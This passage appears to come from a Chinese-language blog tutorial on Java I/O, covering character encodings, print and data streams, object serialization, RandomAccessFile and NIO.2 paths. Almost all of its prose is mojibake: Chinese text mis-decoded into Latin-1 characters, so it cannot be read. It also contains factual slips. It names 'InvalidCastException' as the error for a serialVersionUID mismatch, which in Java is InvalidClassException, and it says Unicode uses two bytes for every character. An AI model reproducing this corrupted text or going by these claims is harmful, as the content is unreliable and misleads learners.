<li><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä½¿ç”¨è½¬æ¢æµæ¥å¤„ç†æ–‡ä»¶ä¹±ç é—®é¢˜ã€‚å®ç°ç¼–ç å’Œè§£ç çš„åŠŸèƒ½ã€‚</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1d2348b58ca17120964e61d189a8d294--c67c--image-20241002184541945.png" alt="image-20241002184541945"></p>
<h4 id="å¤šç§å­—ç¬¦ç¼–ç é›†çš„è¯´æ˜"><a href="#å¤šç§å­—ç¬¦ç¼–ç é›†çš„è¯´æ˜" class="headerlink" title="å¤šç§å­—ç¬¦ç¼–ç é›†çš„è¯´æ˜"></a>å¤šç§å­—ç¬¦ç¼–ç é›†çš„è¯´æ˜</h4><ul>
<li><p>ç¼–ç è¡¨çš„ç”±æ¥</p>
<blockquote>
<p>è®¡ç®—æœºåªèƒ½è¯†åˆ«äºŒè¿›åˆ¶æ•°æ®ï¼Œæ—©æœŸç”±æ¥æ˜¯ç”µä¿¡å·ã€‚ä¸ºäº†æ–¹ä¾¿åº”ç”¨è®¡ç®—æœºï¼Œè®©å®ƒå¯ä»¥è¯†åˆ«å„ä¸ªå›½å®¶çš„æ–‡å­—ã€‚å°±å°†å„ä¸ªå›½å®¶çš„æ–‡å­—ç”¨æ•°å­—æ¥è¡¨ç¤ºï¼Œå¹¶ä¸€ä¸€å¯¹åº”ï¼Œå½¢æˆä¸€å¼ è¡¨ã€‚è¿™å°±æ˜¯ç¼–ç è¡¨ã€‚</p>
</blockquote>
</li>
<li><p>å¸¸è§çš„ç¼–ç è¡¨</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 4.å­—ç¬¦é›†</span></span><br><span class="line"><span class="comment">  *  ASCIIï¼šç¾å›½æ ‡å‡†ä¿¡æ¯äº¤æ¢ç ã€‚</span></span><br><span class="line"><span class="comment">  *     ç”¨ä¸€ä¸ªå­—èŠ‚çš„7ä½å¯ä»¥è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment">  *  ISO8859-1ï¼šæ‹‰ä¸ç è¡¨ã€‚æ¬§æ´²ç è¡¨</span></span><br><span class="line"><span class="comment">  *     ç”¨ä¸€ä¸ªå­—èŠ‚çš„8ä½è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment">  *  GB2312ï¼šä¸­å›½çš„ä¸­æ–‡ç¼–ç è¡¨ã€‚æœ€å¤šä¸¤ä¸ªå­—èŠ‚ç¼–ç æ‰€æœ‰å­—ç¬¦</span></span><br><span class="line"><span class="comment">  *  GBKï¼šä¸­å›½çš„ä¸­æ–‡ç¼–ç è¡¨å‡çº§ï¼Œèåˆäº†æ›´å¤šçš„ä¸­æ–‡æ–‡å­—ç¬¦å·ã€‚æœ€å¤šä¸¤ä¸ªå­—èŠ‚ç¼–ç </span></span><br><span class="line"><span class="comment">  *  Unicodeï¼šå›½é™…æ ‡å‡†ç ï¼Œèåˆäº†ç›®å‰äººç±»ä½¿ç”¨çš„æ‰€æœ‰å­—ç¬¦ã€‚ä¸ºæ¯ä¸ªå­—ç¬¦åˆ†é…å”¯ä¸€çš„å­—ç¬¦ç ã€‚æ‰€æœ‰çš„æ–‡å­—éƒ½ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="comment">  *  UTF-8ï¼šå˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œå¯ç”¨1-4ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicodeä¸å®Œç¾ï¼Œè¿™é‡Œå°±æœ‰ä¸‰ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œè‹±æ–‡å­—æ¯åªç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºå°±å¤Ÿäº†ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯å¦‚ä½•æ‰èƒ½åŒºåˆ«Unicodeå’ŒASCIIï¼Ÿè®¡ç®—æœºæ€ä¹ˆçŸ¥é“ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œè€Œä¸æ˜¯åˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªç¬¦å·å‘¢ï¼Ÿç¬¬ä¸‰ä¸ªï¼Œå¦‚æœå’ŒGBKç­‰åŒå­—èŠ‚ç¼–ç æ–¹å¼ä¸€æ ·ï¼Œç”¨æœ€é«˜ä½æ˜¯1æˆ–0è¡¨ç¤ºä¸¤ä¸ªå­—èŠ‚å’Œä¸€ä¸ªå­—èŠ‚ï¼Œå°±å°‘äº†å¾ˆå¤šå€¼æ— æ³•ç”¨äºè¡¨ç¤ºå­—ç¬¦ï¼Œä¸å¤Ÿè¡¨ç¤ºæ‰€æœ‰å­—ç¬¦ã€‚Unicodeåœ¨å¾ˆé•¿ä¸€æ®µæ—¶é—´å†…æ— æ³•æ¨å¹¿ï¼Œç›´åˆ°äº’è”ç½‘çš„å‡ºç°ã€‚</li>
<li>é¢å‘ä¼ è¾“çš„ä¼—å¤šUTFï¼ˆUCS Transfer Formatï¼‰æ ‡å‡†å‡ºç°äº†ï¼Œé¡¾åæ€ä¹‰ï¼Œ<strong>UTF-8å°±æ˜¯æ¯æ¬¡8ä¸ªä½ä¼ è¾“æ•°æ®ï¼Œè€ŒUTF-16å°±æ˜¯æ¯æ¬¡16ä¸ªä½ã€‚</strong>è¿™æ˜¯ä¸ºä¼ è¾“è€Œè®¾è®¡çš„ç¼–ç ï¼Œå¹¶ä½¿ç¼–ç æ— å›½ç•Œï¼Œè¿™æ ·å°±å¯ä»¥æ˜¾ç¤ºå…¨ä¸–ç•Œä¸Šæ‰€æœ‰æ–‡åŒ–çš„å­—ç¬¦äº†ã€‚</li>
<li>Unicodeåªæ˜¯å®šä¹‰äº†ä¸€ä¸ªåºå¤§çš„ã€å…¨çƒé€šç”¨çš„å­—ç¬¦é›†ï¼Œå¹¶ä¸ºæ¯ä¸ªå­—ç¬¦è§„å®šäº†å”¯ä¸€ç¡®å®šçš„ç¼–å·ï¼Œå…·ä½“å­˜å‚¨æˆä»€ä¹ˆæ ·çš„å­—èŠ‚æµï¼Œå–å†³äºå­—ç¬¦ç¼–ç æ–¹æ¡ˆã€‚æ¨èçš„Unicodeç¼–ç æ˜¯UTF-8å’ŒUTF-16ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/44407cfc98725875886f4b92a502a464--d8e6--image-20241002185539502.png" alt="image-20241002185539502"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d23001b07313a32006b232017fccbda7--c8d3--image-20241002185546613.png" alt="image-20241002185546613"></p>
<h3 id="6-æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ"><a href="#6-æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ" class="headerlink" title="6.æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ"></a>6.æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ</h3><ul>
<li>System.inå’ŒSystem.outåˆ†åˆ«ä»£è¡¨äº†ç³»ç»Ÿæ ‡å‡†çš„è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡</li>
<li>é»˜è®¤è¾“å…¥è®¾å¤‡æ˜¯ï¼šé”®ç›˜ï¼Œè¾“å‡ºè®¾å¤‡æ˜¯ï¼šæ˜¾ç¤ºå™¨</li>
<li>System.inçš„ç±»å‹æ˜¯InputStream</li>
<li>System.outçš„ç±»å‹æ˜¯PrintStreamï¼Œå…¶æ˜¯OutputStreamçš„å­ç±»FilterOutputStreamçš„å­ç±»</li>
<li>é‡å®šå‘ï¼šé€šè¿‡Systemç±»çš„setInï¼ŒsetOutæ–¹æ³•å¯¹é»˜è®¤è®¾å¤‡è¿›è¡Œæ”¹å˜ã€‚<ul>
<li>public static void setIn(InputStreamin)</li>
<li>public static void setOut(PrintStreamout)</li>
</ul>
</li>
</ul>
<h3 id="7-æ‰“å°æµ"><a href="#7-æ‰“å°æµ" class="headerlink" title="7.æ‰“å°æµ"></a>7.æ‰“å°æµ</h3><ul>
<li>å®ç°å°†åŸºæœ¬æ•°æ®ç±»å‹çš„æ•°æ®æ ¼å¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡º</li>
<li>æ‰“å°æµï¼šPrintStreamå’ŒPrintWriter<ul>
<li>æä¾›äº†ä¸€ç³»åˆ—é‡è½½çš„print()å’Œprintln()æ–¹æ³•ï¼Œç”¨äºå¤šç§æ•°æ®ç±»å‹çš„è¾“å‡º</li>
<li>PrintStreamå’ŒPrintWriterçš„è¾“å‡ºä¸ä¼šæŠ›å‡ºIOExceptionå¼‚å¸¸</li>
<li>PrintStreamå’ŒPrintWriteræœ‰è‡ªåŠ¨flushåŠŸèƒ½</li>
<li>PrintStream æ‰“å°çš„æ‰€æœ‰å­—ç¬¦éƒ½ä½¿ç”¨å¹³å°çš„é»˜è®¤å­—ç¬¦ç¼–ç è½¬æ¢ä¸ºå­—èŠ‚ã€‚åœ¨éœ€è¦å†™å…¥å­—ç¬¦è€Œä¸æ˜¯å†™å…¥å­—èŠ‚çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥ä½¿ç”¨PrintWriter ç±»ã€‚</li>
<li>System.outè¿”å›çš„æ˜¯PrintStreamçš„å®ä¾‹</li>
</ul>
</li>
</ul>
<h3 id="8-æ•°æ®æµ"><a href="#8-æ•°æ®æµ" class="headerlink" title="8.æ•°æ®æµ"></a>8.æ•°æ®æµ</h3><ul>
<li><p>ä¸ºäº†æ–¹ä¾¿åœ°æ“ä½œJavaè¯­è¨€çš„åŸºæœ¬æ•°æ®ç±»å‹å’ŒStringçš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨æ•°æ®æµã€‚</p>
</li>
<li><p>æ•°æ®æµæœ‰ä¸¤ä¸ªç±»ï¼š(ç”¨äºè¯»å–å’Œå†™å‡ºåŸºæœ¬æ•°æ®ç±»å‹ã€Stringç±»çš„æ•°æ®ï¼‰</p>
<ul>
<li>DataInputStreamå’ŒDataOutputStream</li>
<li>åˆ†åˆ«â€œå¥—æ¥â€åœ¨InputStreamå’ŒOutputStreamå­ç±»çš„æµä¸Š</li>
</ul>
</li>
<li><p>DataInputStreamä¸­çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">readBoolean</span><span class="params">()</span>	<span class="type">byte</span> <span class="title function_">readByte</span><span class="params">()</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">readChar</span><span class="params">()</span>	<span class="type">float</span> <span class="title function_">readFloat</span><span class="params">()</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">readDouble</span><span class="params">()</span>	<span class="type">short</span> <span class="title function_">readShort</span><span class="params">()</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">readLong</span><span class="params">()</span>	<span class="type">int</span> <span class="title function_">readInt</span><span class="params">()</span></span><br><span class="line">String <span class="title function_">readUTF</span><span class="params">()</span>	<span class="keyword">void</span> <span class="title function_">readFully</span><span class="params">(<span class="type">byte</span>[s] b)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>DataOutputStreamä¸­çš„æ–¹æ³•</p>
<ul>
<li>å°†ä¸Šè¿°çš„æ–¹æ³•çš„readæ”¹ä¸ºç›¸åº”çš„writeå³å¯ã€‚</li>
</ul>
</li>
</ul>
<h3 id="9-å¯¹è±¡æµ"><a href="#9-å¯¹è±¡æµ" class="headerlink" title="9.å¯¹è±¡æµ"></a>9.å¯¹è±¡æµ</h3><h4 id="å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶çš„ç†è§£"><a href="#å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶çš„ç†è§£" class="headerlink" title="å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶çš„ç†è§£"></a>å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶çš„ç†è§£</h4><ul>
<li>ObjectInputStreamå’ŒOjbectOutputSteam</li>
<li>ç”¨äºå­˜å‚¨å’Œè¯»å–åŸºæœ¬æ•°æ®ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„å¤„ç†æµã€‚å®ƒçš„å¼ºå¤§ä¹‹å¤„å°±æ˜¯å¯ä»¥æŠŠJavaä¸­çš„å¯¹è±¡å†™å…¥åˆ°æ•°æ®æºä¸­ï¼Œä¹Ÿèƒ½æŠŠå¯¹è±¡ä»æ•°æ®æºä¸­è¿˜åŸå›æ¥ã€‚</li>
<li>åºåˆ—åŒ–ï¼šç”¨ObjectOutputStreamç±»ä¿å­˜åŸºæœ¬ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„æœºåˆ¶</li>
<li>ååºåˆ—åŒ–ï¼šç”¨ObjectInputStreamç±»è¯»å–åŸºæœ¬ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„æœºåˆ¶</li>
<li>ObjectOutputStreamå’ŒObjectInputStreamä¸èƒ½åºåˆ—åŒ–staticå’Œtransientä¿®é¥°çš„æˆå‘˜å˜é‡</li>
<li>å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶å…è®¸æŠŠå†…å­˜ä¸­çš„Javaå¯¹è±¡è½¬æ¢æˆå¹³å°æ— å…³çš„äºŒè¿›åˆ¶æµï¼Œä»è€Œå…è®¸æŠŠè¿™ç§äºŒè¿›åˆ¶æµæŒä¹…åœ°ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œæˆ–é€šè¿‡ç½‘ç»œå°†è¿™ç§äºŒè¿›åˆ¶æµä¼ è¾“åˆ°å¦ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ã€‚&#x2F;&#x2F;å½“å…¶å®ƒç¨‹åºè·å–äº†è¿™ç§äºŒè¿›åˆ¶æµï¼Œå°±å¯ä»¥æ¢å¤æˆåŸæ¥çš„Javaå¯¹è±¡</li>
<li>åºåˆ—åŒ–çš„å¥½å¤„åœ¨äºå¯å°†ä»»ä½•å®ç°äº†Serializableæ¥å£çš„å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æ•°æ®ï¼Œä½¿å…¶åœ¨ä¿å­˜å’Œä¼ è¾“æ—¶å¯è¢«è¿˜åŸ</li>
<li>åºåˆ—åŒ–æ˜¯RMIï¼ˆRemote Method Invoke â€“è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰è¿‡ç¨‹çš„å‚æ•°å’Œè¿”å›å€¼éƒ½å¿…é¡»å®ç°çš„æœºåˆ¶ï¼Œè€ŒRMI æ˜¯JavaEEçš„åŸºç¡€ã€‚å› æ­¤åºåˆ—åŒ–æœºåˆ¶æ˜¯JavaEEå¹³å°çš„åŸºç¡€</li>
<li>å¦‚æœéœ€è¦è®©æŸä¸ªå¯¹è±¡æ”¯æŒåºåˆ—åŒ–æœºåˆ¶ï¼Œåˆ™å¿…é¡»è®©å¯¹è±¡æ‰€å±çš„ç±»åŠå…¶å±æ€§æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œä¸ºäº†è®©æŸä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œè¯¥ç±»å¿…é¡»å®ç°å¦‚ä¸‹ä¸¤ä¸ªæ¥å£ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œä¼šæŠ›å‡ºNotSerializableExceptionå¼‚å¸¸<ul>
<li>Serializable</li>
<li>Externalizable</li>
</ul>
</li>
</ul>
<h4 id="è‡ªå®šä¹‰ç±»å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œ"><a href="#è‡ªå®šä¹‰ç±»å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œ" class="headerlink" title="è‡ªå®šä¹‰ç±»å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œ"></a>è‡ªå®šä¹‰ç±»å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ“ä½œ</h4><ul>
<li><p>è‹¥æŸä¸ªç±»å®ç°äº†Serializableæ¥å£ï¼Œè¯¥ç±»çš„å¯¹è±¡å°±æ˜¯å¯åºåˆ—åŒ–çš„ï¼š</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªObjectOutputStream</li>
<li>è°ƒç”¨ObjectOutputStreamå¯¹è±¡çš„writeObject(å¯¹è±¡) æ–¹æ³•è¾“å‡ºå¯åºåˆ—åŒ–å¯¹è±¡</li>
<li>æ³¨æ„å†™å‡ºä¸€æ¬¡ï¼Œæ“ä½œflush()ä¸€æ¬¡</li>
</ul>
</li>
<li><p>ååºåˆ—åŒ–</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªObjectInputStreamïƒ˜è°ƒç”¨readObject() æ–¹æ³•è¯»å–æµä¸­çš„å¯¹è±¡</li>
</ul>
</li>
<li><p>å¼ºè°ƒï¼šå¦‚æœæŸä¸ªç±»çš„å±æ€§ä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æˆ–String  ç±»å‹ï¼Œè€Œæ˜¯å¦ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œé‚£ä¹ˆè¿™ä¸ªå¼•ç”¨ç±»å‹å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œå¦åˆ™æ‹¥æœ‰è¯¥ç±»å‹çš„Field çš„ç±»ä¹Ÿä¸èƒ½åºåˆ—åŒ–</p>
</li>
<li><p>Personç±»</p>
</li>
</ul>
<h4 id="serialVersionUIDçš„ç†è§£"><a href="#serialVersionUIDçš„ç†è§£" class="headerlink" title="serialVersionUIDçš„ç†è§£"></a>serialVersionUIDçš„ç†è§£</h4><ul>
<li><p>å‡¡æ˜¯å®ç°Serializableæ¥å£çš„ç±»éƒ½æœ‰ä¸€ä¸ªè¡¨ç¤ºåºåˆ—åŒ–ç‰ˆæœ¬æ ‡è¯†ç¬¦çš„é™æ€å˜é‡ï¼š</p>
<ul>
<li>private static final long serialVersionUID;</li>
<li>serialVersionUIDç”¨æ¥è¡¨æ˜ç±»çš„ä¸åŒç‰ˆæœ¬é—´çš„å…¼å®¹æ€§ã€‚ç®€è¨€ä¹‹ï¼Œå…¶ç›®çš„æ˜¯ä»¥åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œæœ‰å…³å„ç‰ˆæœ¬ååºåˆ—åŒ–æ—¶æ˜¯å¦å…¼å®¹ã€‚</li>
<li>å¦‚æœç±»æ²¡æœ‰æ˜¾ç¤ºå®šä¹‰è¿™ä¸ªé™æ€å¸¸é‡ï¼Œå®ƒçš„å€¼æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒæ ¹æ®ç±»çš„å†…éƒ¨ç»†èŠ‚è‡ªåŠ¨ç”Ÿæˆçš„ã€‚è‹¥ç±»çš„å®ä¾‹å˜é‡åšäº†ä¿®æ”¹ï¼ŒserialVersionUIDå¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚æ•…å»ºè®®ï¼Œæ˜¾å¼å£°æ˜ã€‚</li>
</ul>
</li>
<li><p>ç®€å•æ¥è¯´ï¼ŒJavaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åœ¨è¿è¡Œæ—¶åˆ¤æ–­ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¬åœ°ç›¸åº”å®ä½“ç±»çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºç°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸ã€‚(InvalidCastException)</p>
</li>
<li><p>Personç±»</p>
</li>
</ul>
<h3 id="10-éšæœºå­˜å–æ–‡ä»¶æµ"><a href="#10-éšæœºå­˜å–æ–‡ä»¶æµ" class="headerlink" title="10.éšæœºå­˜å–æ–‡ä»¶æµ"></a>10.éšæœºå­˜å–æ–‡ä»¶æµ</h3><ul>
<li><p>RandomAccessFile å£°æ˜åœ¨java.ioåŒ…ä¸‹ï¼Œä½†ç›´æ¥ç»§æ‰¿äºjava.lang.Objectç±»ã€‚å¹¶ä¸”å®ƒå®ç°äº†DataInputã€DataOutputè¿™ä¸¤ä¸ªæ¥å£ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªç±»æ—¢å¯ä»¥è¯»ä¹Ÿå¯ä»¥å†™ã€‚</p>
</li>
<li><p>RandomAccessFile ç±»æ”¯æŒâ€œéšæœºè®¿é—®â€ çš„æ–¹å¼ï¼Œç¨‹åºå¯ä»¥ç›´æ¥è·³åˆ°æ–‡ä»¶çš„ä»»æ„åœ°æ–¹æ¥è¯»ã€å†™æ–‡ä»¶</p>
<ul>
<li>æ”¯æŒåªè®¿é—®æ–‡ä»¶çš„éƒ¨åˆ†å†…å®¹</li>
<li>å¯ä»¥å‘å·²å­˜åœ¨çš„æ–‡ä»¶åè¿½åŠ å†…å®¹</li>
</ul>
</li>
<li><p>RandomAccessFile å¯¹è±¡åŒ…å«ä¸€ä¸ªè®°å½•æŒ‡é’ˆï¼Œç”¨ä»¥æ ‡ç¤ºå½“å‰è¯»å†™å¤„çš„ä½ç½®ã€‚RandomAccessFileç±»å¯¹è±¡å¯ä»¥è‡ªç”±ç§»åŠ¨è®°å½•æŒ‡é’ˆï¼š</p>
<ul>
<li>long getFilePointer()ï¼šè·å–æ–‡ä»¶è®°å½•æŒ‡é’ˆçš„å½“å‰ä½ç½®</li>
<li>void seek(long pos)ï¼šå°†æ–‡ä»¶è®°å½•æŒ‡é’ˆå®šä½åˆ°posä½ç½®</li>
</ul>
</li>
<li><p>æ„é€ å™¨</p>
<ul>
<li>public RandomAccessFile(Filefile, Stringmode) </li>
<li>public RandomAccessFile(Stringname, Stringmode)</li>
</ul>
</li>
<li><p>åˆ›å»ºRandomAccessFileç±»å®ä¾‹éœ€è¦æŒ‡å®šä¸€ä¸ªmode å‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šRandomAccessFileçš„è®¿é—®æ¨¡å¼ï¼š</p>
<ul>
<li>r: ä»¥åªè¯»æ–¹å¼æ‰“å¼€</li>
<li>rwï¼šæ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥</li>
<li>rwd:æ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥ï¼›åŒæ­¥æ–‡ä»¶å†…å®¹çš„æ›´æ–°</li>
<li>rws:æ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥ï¼›åŒæ­¥æ–‡ä»¶å†…å®¹å’Œå…ƒæ•°æ®çš„æ›´æ–°</li>
</ul>
</li>
<li><p>å¦‚æœæ¨¡å¼ä¸ºåªè¯»rã€‚åˆ™ä¸ä¼šåˆ›å»ºæ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šå»è¯»å–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¦‚æœè¯»å–çš„æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå‡ºç°å¼‚å¸¸ã€‚å¦‚æœæ¨¡å¼ä¸ºrwè¯»å†™ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå»åˆ›å»ºæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¸ä¼šåˆ›å»ºã€‚</p>
</li>
</ul>
<h3 id="11-NIO-2ä¸­Pathã€Pathsã€Filesç±»çš„ä½¿ç”¨"><a href="#11-NIO-2ä¸­Pathã€Pathsã€Filesç±»çš„ä½¿ç”¨" class="headerlink" title="11.NIO.2ä¸­Pathã€Pathsã€Filesç±»çš„ä½¿ç”¨"></a>11.NIO.2ä¸­Pathã€Pathsã€Filesç±»çš„ä½¿ç”¨</h3><ul>
<li><p>Java NIO (New IOï¼ŒNon-Blocking IO)æ˜¯ä»Java 1.4ç‰ˆæœ¬å¼€å§‹å¼•å…¥çš„ä¸€å¥—æ–°çš„IO APIï¼Œå¯ä»¥æ›¿ä»£æ ‡å‡†çš„Java IO APIã€‚NIOä¸åŸæ¥çš„IOæœ‰åŒæ ·çš„ä½œç”¨å’Œç›®çš„ï¼Œä½†æ˜¯ä½¿ç”¨çš„æ–¹å¼å®Œå…¨ä¸åŒï¼ŒNIOæ”¯æŒé¢å‘ç¼“å†²åŒºçš„(IOæ˜¯é¢å‘æµçš„)ã€åŸºäºé€šé“çš„IOæ“ä½œã€‚NIOå°†ä»¥æ›´åŠ é«˜æ•ˆçš„æ–¹å¼è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚</p>
</li>
<li><p>Java APIä¸­æä¾›äº†ä¸¤å¥—NIOï¼Œä¸€å¥—æ˜¯é’ˆå¯¹æ ‡å‡†è¾“å…¥è¾“å‡ºNIOï¼Œå¦ä¸€å¥—å°±æ˜¯ç½‘ç»œç¼–ç¨‹NIOã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">|-----java.nio.channels.Channel</span><br><span class="line">    |-----FileChannel:å¤„ç†æœ¬åœ°æ–‡ä»¶</span><br><span class="line">    |-----SocketChannelï¼šTCPç½‘ç»œç¼–ç¨‹çš„å®¢æˆ·ç«¯çš„Channel</span><br><span class="line">    |-----ServerSocketChannel:TCPç½‘ç»œç¼–ç¨‹çš„æœåŠ¡å™¨ç«¯çš„Channel</span><br><span class="line">    |-----DatagramChannelï¼šUDPç½‘ç»œç¼–ç¨‹ä¸­å‘é€ç«¯å’Œæ¥æ”¶ç«¯çš„Channel</span><br></pre></td></tr></table></figure>
</li>
<li><p>éšç€JDK 7 çš„å‘å¸ƒï¼ŒJavaå¯¹NIOè¿›è¡Œäº†æå¤§çš„æ‰©å±•ï¼Œå¢å¼ºäº†å¯¹æ–‡ä»¶å¤„ç†å’Œæ–‡ä»¶ç³»ç»Ÿç‰¹æ€§çš„æ”¯æŒï¼Œä»¥è‡³äºæˆ‘ä»¬ç§°ä»–ä»¬ä¸ºNIO.2ã€‚å› ä¸ºNIO æä¾›çš„ä¸€äº›åŠŸèƒ½ï¼ŒNIOå·²ç»æˆä¸ºæ–‡ä»¶å¤„ç†ä¸­è¶Šæ¥è¶Šé‡è¦çš„éƒ¨åˆ†ã€‚</p>
</li>
<li><p>æ—©æœŸçš„Javaåªæä¾›äº†ä¸€ä¸ªFileç±»æ¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼Œä½†Fileç±»çš„åŠŸèƒ½æ¯”è¾ƒæœ‰é™ï¼Œæ‰€æä¾›çš„æ–¹æ³•æ€§èƒ½ä¹Ÿä¸é«˜ã€‚è€Œä¸”ï¼Œå¤§å¤šæ•°æ–¹æ³•åœ¨å‡ºé”™æ—¶ä»…è¿”å›å¤±è´¥ï¼Œå¹¶ä¸ä¼šæä¾›å¼‚å¸¸ä¿¡æ¯ã€‚</p>
</li>
<li><p>NIO. 2ä¸ºäº†å¼¥è¡¥è¿™ç§ä¸è¶³ï¼Œå¼•å…¥äº†Pathæ¥å£ï¼Œä»£è¡¨ä¸€ä¸ªå¹³å°æ— å…³çš„å¹³å°è·¯å¾„ï¼Œæè¿°äº†ç›®å½•ç»“æ„ä¸­æ–‡ä»¶çš„ä½ç½®ã€‚Pathå¯ä»¥çœ‹æˆæ˜¯Fileç±»çš„å‡çº§ç‰ˆæœ¬ï¼Œå®é™…å¼•ç”¨çš„èµ„æºä¹Ÿå¯ä»¥ä¸å­˜åœ¨ã€‚</p>
</li>
<li><p>åœ¨ä»¥å‰IOæ“ä½œéƒ½æ˜¯è¿™æ ·å†™çš„:</p>
<ul>
<li>import java.io.File;</li>
<li>File file &#x3D; new File(â€œindex.htmlâ€);</li>
</ul>
</li>
<li><p>ä½†åœ¨Java7 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å†™ï¼š</p>
<ul>
<li>import java.nio.file.Path;</li>
<li>import java.nio.file.Paths;</li>
<li>Path path &#x3D; Paths.get(â€œindex.htmlâ€);</li>
</ul>
</li>
<li><p>åŒæ—¶ï¼ŒNIO.2åœ¨java.nio.fileåŒ…ä¸‹è¿˜æä¾›äº†Filesã€Pathså·¥å…·ç±»ï¼ŒFilesåŒ…å«äº†å¤§é‡é™æ€çš„å·¥å…·æ–¹æ³•æ¥æ“ä½œæ–‡ä»¶ï¼›Pathsåˆ™åŒ…å«äº†ä¸¤ä¸ªè¿”å›Pathçš„é™æ€å·¥å‚æ–¹æ³•ã€‚</p>
</li>
<li><p>Paths ç±»æä¾›çš„é™æ€get() æ–¹æ³•ç”¨æ¥è·å–Path å¯¹è±¡ï¼š</p>
<ul>
<li>static Pathget(String first, String â€¦ more) : ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²ä¸²è¿æˆè·¯å¾„</li>
<li>static Path get(URI uri): è¿”å›æŒ‡å®šuriå¯¹åº”çš„Pathè·¯å¾„</li>
</ul>
</li>
